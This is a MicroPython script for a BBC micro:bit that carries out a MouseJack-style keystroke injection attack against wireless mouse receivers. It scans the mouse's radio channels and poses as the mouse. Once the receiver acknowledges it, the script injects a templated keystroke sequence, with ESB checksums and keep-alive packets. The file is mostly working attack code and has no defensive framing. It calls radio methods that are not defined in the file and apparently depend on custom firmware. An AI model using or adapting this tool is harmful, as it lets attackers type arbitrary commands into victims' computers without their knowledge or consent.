import radio
from microbit import *

TIMEOUT = 500

TG_MICE = {mice_mac}
M_CHANNELS = [5, 8, 14, 17, 32, 35, 41, 44, 62, 65, 71, 74]
M_ADDR  = TG_MICE[0]<<24 | TG_MICE[1]<<16 | TG_MICE[2]<<8 | TG_MICE[3]
M_GROUP = TG_MICE[4]

ATK_KEYS = """
{keystrokes}
""".replace("\n", "")


ATK_SIZE = int(len(ATK_KEYS) / 3)
ATK_TIMEOUT = 100


def esb_checksum(payload):
    cksum = 0xff
    for n in range(0, len(payload)):
        cksum = (cksum - payload[n]) & 0xff
    cksum = (cksum + 1) & 0xff
    return cksum

def esb_send_bytes(radio, payload):
    cks = esb_checksum(payload)
    pkt = payload + [cks]
    print('pkt: %s' % pkt)
    radio.send_bytes(bytes(bytearray(pkt)))

    del cks
    del pkt

def esb_send_keys(radio, keys):
    print('Send: %s' % keys)
    radio.esb_send_keys(bytes(bytearray(keys)))

def esb_send_keep_alive(radio, keep_alive):
    payload = [0x00, 0x40, keep_alive[0], keep_alive[1]]
    esb_send_bytes(radio, payload)
    # print('KA %s' % payload)
    del payload

def esb_send_set_keep_alive(radio, keep_alive):
    payload = [0x00, 0x4f, 0x00, keep_alive[0], keep_alive[1], 0x00, 0x00, 0x00, 0x00]
    esb_send_bytes(radio, payload)
    print('set_KA %s' % payload)
    del payload


radio.on()
radio.config(data_rate=radio.RATE_2MBIT, channel=5, queue=10, address=M_ADDR, group=M_GROUP)

print('[+] Scanning channels for my mice !')

channel_shift_state = True
send_attack_state = False
create_fake_mouse = True


while True:

    channel_i = 0
    last_channel_shift = running_time()
    # last_rx_paket_pid = 0xFF

    print('[Scan mode] A: pause | B: resume')

    while not send_attack_state:
        now = running_time()

        # Shift to the next channel
        if (now - last_channel_shift) > TIMEOUT and channel_shift_state:
            last_channel_shift = now

            channel_i += 1
            if channel_i == len(M_CHANNELS):
                channel_i = 0

            radio.config(data_rate=radio.RATE_2MBIT, channel=M_CHANNELS[channel_i])
            radio.esb()

        if create_fake_mouse:
            radio.send_bytes(b'\xa4\xc2\x00\x00\xfe\xff\xff\x00\x00\x9e')

        pkt = radio.receive_bytes()
        if pkt is not None:
            if pkt[0] == 0x00:
                print('[+] Receive ACK, sending paket now...')
                channel_shift_state = False
                send_attack_state = True
                sleep(500)

        del pkt
        del now

    del channel_i
    del last_channel_shift

    print('[Attack mode] A: to send packets | B: scan mode')

    # send keep-alive paket
    keep_alive_count = 0
    key_count = 0
    should_send_key = False

    last_tx_paket_keep_alive = running_time()
    last_tx_paket_ts = running_time()
    tx_paket_timeout = ATK_TIMEOUT
    tx_paket_keep_alive_timeout = 780
    previous_keys = [0]

    # send the first keep_alive packets
    radio.esb_send_keep_alive()

    while send_attack_state:
            has_send_paket = False
            if should_send_key:
                meta      = ord(ATK_KEYS[(3*key_count) + 0])
                key       = ord(ATK_KEYS[(3*key_count) + 1])
                sleep_sec = ord(ATK_KEYS[(3*key_count) + 2])
                key_count += 1

                print('Sending %s-%s, sleep %s' % (meta, key, sleep_sec))
                if sleep_sec > 0:
                    if len(previous_keys) > 1:
                        esb_send_keys(radio, previous_keys)
                        previous_keys = [0]
                    tx_paket_timeout = sleep_sec * 1000
                    has_send_paket = True
                else:
                    tx_paket_timeout = 333 # ATK_TIMEOUT
                    if meta > 0:
                        if len(previous_keys) > 1:
                            esb_send_keys(radio, previous_keys)
                            previous_keys = [0]
                        esb_send_keys(radio, [meta, key])
                        has_send_paket = True
                    else:
                        if key in previous_keys:
                            esb_send_keys(radio, previous_keys)
                            previous_keys = [0, key]
                            has_send_paket = True
                        else:
                            previous_keys.append(key)

                            if len(previous_keys) == 7:
                                esb_send_keys(radio, previous_keys)
                                previous_keys = [0]
                                has_send_paket = True


                if has_send_paket:
                    should_send_key = False
                    last_tx_paket_ts = running_time()

            # if has_send_paket:
            radio.esb_send_keep_alive2()

            if button_a.is_pressed() and not should_send_key:
                if running_time() - last_tx_paket_ts > tx_paket_timeout:
                    should_send_key = True
                    print('[+] Should send key')

            if button_b.is_pressed() and not channel_shift_state:
                print('[+] Switch to scan mode')
                channel_shift_state = True
                send_attack_state = False
                sleep(500)
